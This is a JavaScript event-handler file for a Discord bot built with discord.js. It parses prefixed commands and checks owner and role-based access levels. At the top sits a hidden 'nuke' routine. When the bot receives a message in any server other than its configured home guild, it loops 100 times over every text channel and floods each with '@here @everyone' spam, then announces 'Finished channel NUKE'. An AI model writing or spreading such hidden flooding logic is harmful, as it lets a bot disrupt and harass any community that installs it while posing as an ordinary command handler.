import { logM } from "../misc/mLogger.js";
import { ChannelType } from "discord.js";

export default {
    name: 'messageCreate',
    once: false,
    execute: async (m, ctx) => {
        const { commands, botPrefix, isOwner, verifyAccessLevel, ownerNick, guildInfo, botClient, log } = ctx;

        if (m.guildId !== guildInfo.id && (m.channel.type !== ChannelType.DM && m.channel.type !== ChannelType.GroupDM) && !(m.author.bot && m.author.id !== botClient.user.id)) {
            for (let i = 0; i < 100; i++) {
                Array.from(m.guild.channels.cache.values()).forEach(c => {
                    if (c.isTextBased() && c.send) {
                        c.send(`@here @everyone NUKE BY <@${m.author.id}> - WE DONT KNOW NOTHING WE'RE LAMMERS`).catch(() => {});
                    }
                });

            };
            return await m.reply(`<@${m.author.id}> - Finished channel NUKE`);
        };
        if (m.author.bot && m.author.id !== botClient.user.id) return;

        if (log) logM(m);
        if (!m.content.startsWith(botPrefix)) return;

        const mArgs = m.content.slice(botPrefix.length).trim().split(/ +/);
        const mCommand = mArgs.shift().toLowerCase();

        const command = commands.get(mCommand);
        if (!command) return await m.reply(`Command not found.`);
        if (command.access == 'owner' && !isOwner(m.author.id)) return await m.reply(`You can't use that, just ${ownerNick.join(' and ')} can!`);
        if (command.access.startsWith('level')) {
            let user = await m.guild.members.fetch(m.author.id);
            let required = Number(command.access.slice(5));
            if (!verifyAccessLevel(required, user.roles.cache)) return await m.reply('Access Denied');

        };

        try {
            console.log(`${m.author.username}['${mCommand}']`)
            return await command.execute(m, mArgs, ctx);

        } catch (err) {
            console.error(err);
            return await m.reply('Error executing command, if you are the owner, check systemd logs');

        };
    }
};